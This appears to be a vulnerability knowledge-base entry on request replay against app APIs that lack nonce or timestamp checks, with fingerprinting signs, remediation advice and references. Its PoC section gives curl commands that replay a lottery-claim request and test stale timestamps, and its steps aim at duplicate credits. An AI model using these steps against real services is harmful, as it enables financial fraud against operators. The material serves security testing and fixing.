---
id: "api-replay-nonce-missing"
title: "Missing API nonce / timestamp → request replay (deposits, rewards, bets)"
kind: "implementation"
cve: null
related-cves: null
cve-note: "None (implementation flaw)"
severity: "high"
cvss: 8.2
severity-basis: "cvss"
severity-note: null
product: "Custom App/mini-program API"
versions: "Any"
ports: "80, 443"
keywords: "replay, replay, nonce, timestamp, signature, idempotency"
entry: "Missing nonce validation on deposit/reward/betting endpoints"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (implementation flaws; no CVE)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

- Request headers contain only `sign`/`timestamp`, without `nonce`; or the server does not validate the timestamp window;
- Sending the same request twice succeeds both times.

## Prerequisites

- Ability to capture traffic (App/mini-program); an endpoint that changes funds or entitlements.

## PoC

```bash
# 1) Replay once unchanged (do not modify any fields)
curl -s -X POST https://target/api/lottery/claim -H 'Content-Type: application/json' \
 -H 'X-Sign: <sign>' -d '{"actId":1,"uid":1001}' -o /tmp/r1.json -w '%{http_code}\n'
curl -s -X POST https://target/api/lottery/claim -H 'Content-Type: application/json' \
 -H 'X-Sign: <sign>' -d '{"actId":1,"uid":1001}' -o /tmp/r2.json -w '%{http_code}\n'
diff /tmp/r1.json /tmp/r2.json && echo "Both succeeded = replay possible"

# 2) Set timestamp to an old value and check whether the server validates the window
curl -s -X POST https://target/api/lottery/claim -H 'X-Sign: <sign>' \
 -H 'X-Timestamp: 1700000000' -d '{"actId":1,"uid":1001}' -w '%{http_code}\n'
# Result: an old timestamp still returns 200 = no time-window validation
```

## Exploitation Steps

1. First replay unchanged (most reliable) and check for duplicate credits;
2. Then try an old timestamp/an empty nonce;
3. Success means "unlimited replay" — a financial issue; describe the impact clearly;
4. Evidence: both responses + the balance change.

## Remediation and Mitigation

- Maintain a server-side nonce cache (single use) + a timestamp window of ±5 minutes;
- Deduplicate financial requests with an idempotency key (bizId).

## References

- OWASP API Security; CWE-294.
